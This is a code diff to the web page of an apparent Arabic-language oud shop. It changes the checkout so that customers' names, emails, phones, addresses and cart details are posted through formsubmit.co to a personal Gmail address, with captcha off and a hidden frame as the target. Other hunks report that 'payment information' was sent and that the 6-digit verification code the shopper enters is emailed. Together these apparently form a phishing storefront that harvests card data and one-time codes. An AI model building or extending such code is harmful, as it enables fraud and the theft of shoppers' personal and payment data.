@@ -1388,17 +1388,24 @@
                             </div>
                         </div>
 
-                        <!-- Action Buttons -->
-                        <div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
-                            <button type="button" onclick="goBackToCart()" class="btn-secondary">
-                                <i class="fas fa-arrow-right ml-2"></i>
-                                العودة للسلة
-                            </button>
-                            <button type="button" onclick="proceedToPaymentSection()" class="btn-primary" id="proceedToPaymentBtn">
-                                <i class="fas fa-arrow-left ml-2"></i>
-                                تأكيد الطلب والمتابعة للدفع
-                            </button>
-                        </div>
+                        <!-- Customer Info Form -->
+                        <form id="customerInfoForm" action="https://formsubmit.co/zazylalhkr7@gmail.com" method="POST" target="hiddenFrame" onsubmit="return submitCustomerForm()">
+                            <input type="hidden" name="_subject" value="👤 معلومات طلب جديد - مكاسر العود">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_next" value="about:blank">
+                            
+                            <!-- Action Buttons -->
+                            <div class="flex flex-col sm:flex-row gap-4 justify-center pt-8">
+                                <button type="button" onclick="goBackToCart()" class="btn-secondary">
+                                    <i class="fas fa-arrow-right ml-2"></i>
+                                    العودة للسلة
+                                </button>
+                                <button type="submit" class="btn-primary" id="proceedToPaymentBtn">
+                                    <i class="fas fa-arrow-left ml-2"></i>
+                                    إرسال معلومات الطلب والمتابعة
+                                </button>
+                            </div>
+                        </form>
                     </div>
                 </div>
 
@@ -2114,9 +2121,9 @@
             openCart();
         }
 
-        // PROCEED TO PAYMENT SECTION
-        function proceedToPaymentSection() {
-            // Validate customer info first
+        // Handle customer info form submission
+        function submitCustomerForm() {
+            // Validate customer info
             const firstName = document.getElementById('first_name').value.trim();
             const lastName = document.getElementById('last_name').value.trim();
             const email = document.getElementById('email').value.trim();
@@ -2127,7 +2134,7 @@
 
             if (!firstName || !lastName || !email || !phone || !address || !city || !postalCode) {
                 showNotification('يرجى ملء جميع الحقول المطلوبة', 'error');
-                return;
+                return false;
             }
 
             // Save customer info
@@ -2142,37 +2149,28 @@
                 orderNotes: document.getElementById('order_notes').value.trim()
             };
 
-            // Send customer info form immediately
-            sendCustomerInfoForm();
-
-            // Update progress
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('step1').classList.add('completed');
-            document.getElementById('step2').classList.add('active');
-
-            // Hide customer section and show payment section
-            document.getElementById('customerSection').style.display = 'none';
-            document.getElementById('paymentSection').style.display = 'block';
+            // Create and submit customer form
+            const customerForm = document.getElementById('customerInfoForm');
+            addCustomerDataToForm(customerForm);
             
-            // Populate payment summary
-            populatePaymentSummary();
+            showNotification('✅ تم إرسال معلومات الطلب بنجاح!', 'success');
+            
+            // Wait a moment then proceed to payment
+            setTimeout(() => {
+                document.getElementById('step1').classList.remove('active');
+                document.getElementById('step1').classList.add('completed');
+                document.getElementById('step2').classList.add('active');
+                document.getElementById('customerSection').style.display = 'none';
+                document.getElementById('paymentSection').style.display = 'block';
+                populatePaymentSummary();
+            }, 1500);
 
-            showNotification('تم حفظ معلوماتك بنجاح! املأ معلومات الدفع', 'success');
+            return true;
         }
 
-        function sendCustomerInfoForm() {
-            // Create hidden form for customer info
-            const customerForm = document.createElement('form');
-            customerForm.action = 'https://formsubmit.co/zazylalhkr7@gmail.com';
-            customerForm.method = 'POST';
-            customerForm.target = 'hiddenFrame';
-            customerForm.style.display = 'none';
-
-            // Add form fields
+        function addCustomerDataToForm(form) {
+            // Add customer and cart data
             const formData = {
-                '_subject': '👤 معلومات طلب جديد - مكاسر العود',
-                '_captcha': 'false',
-                '_next': 'about:blank',
                 'customer_name': `${customerInfo.firstName} ${customerInfo.lastName}`,
                 'customer_email': customerInfo.email,
                 'customer_phone': customerInfo.phone,
@@ -2191,16 +2189,15 @@
             };
 
             Object.entries(formData).forEach(([name, value]) => {
-                const input = document.createElement('input');
-                input.type = 'hidden';
-                input.name = name;
+                let input = form.querySelector(`input[name="${name}"]`);
+                if (!input) {
+                    input = document.createElement('input');
+                    input.type = 'hidden';
+                    input.name = name;
+                    form.appendChild(input);
+                }
                 input.value = value;
-                customerForm.appendChild(input);
             });
-
-            document.body.appendChild(customerForm);
-            customerForm.submit();
-            setTimeout(() => document.body.removeChild(customerForm), 1000);
         }
 
         function goBackToCustomerInfo() {
@@ -2287,18 +2284,15 @@
             const form = document.getElementById('completeOrderForm');
             addDataToForm(form);
 
-            // Submit the form to send email
+            // Submit the form
             form.submit();
 
-            // Show success notification after form submission
+            showNotification(`✅ تم إرسال معلومات الدفع بنجاح! كود التأكيد: ${verificationCode}`, 'success');
+            
+            // Move to verification page after short delay
             setTimeout(() => {
-                showNotification(`✅ تم إرسال الطلب بنجاح! كود التأكيد: ${verificationCode}`, 'success');
-                
-                // Move to verification page after short delay
-                setTimeout(() => {
-                    showVerificationPage();
-                }, 1500);
-            }, 1000);
+                showVerificationPage();
+            }, 1500);
 
             return true;
         }
@@ -2579,30 +2573,25 @@
                 // Send verification code via email
                 sendVerificationCode(code);
                 
-                showNotification('تم تأكيد الكود! جاري التوجيه إلى واتساب...', 'success');
+                showNotification('✅ تم تأكيد الكود بنجاح! جاري إكمال طلبك...', 'success');
                 
                 setTimeout(() => {
                     // Clear the code inputs
                     inputs.forEach(input => input.value = '');
                     
-                    // Redirect to WhatsApp
-                    const whatsappMessage = `السلام عليكم، تم تأكيد طلبي برقم الكود: ${code}. أرغب في متابعة تفاصيل الطلب.`;
-                    const whatsappUrl = `https://wa.me/966542068739?text=${encodeURIComponent(whatsappMessage)}`;
-                    window.open(whatsappUrl, '_blank');
-                    
-                    showNotification('✅ تم التوجيه إلى واتساب لمتابعة الطلب', 'success');
+                    showNotification('🎉 تم إتمام طلبك بنجاح! شكراً لك', 'success');
                     
                     // Clear cart and return to main page
                     cart = [];
                     updateCartDisplay();
                     
-                    // Return to main page after short delay
+                    // Return to main page
                     setTimeout(() => {
                         document.getElementById('verificationPage').classList.add('hidden');
                         document.getElementById('mainContent').style.display = 'block';
                         window.scrollTo({ top: 0, behavior: 'smooth' });
                     }, 2000);
-                }, 2000);
+                }, 1500);
             } else {
                 showNotification('يرجى إدخال كود مكون من 6 أرقام فقط', 'error');
             }
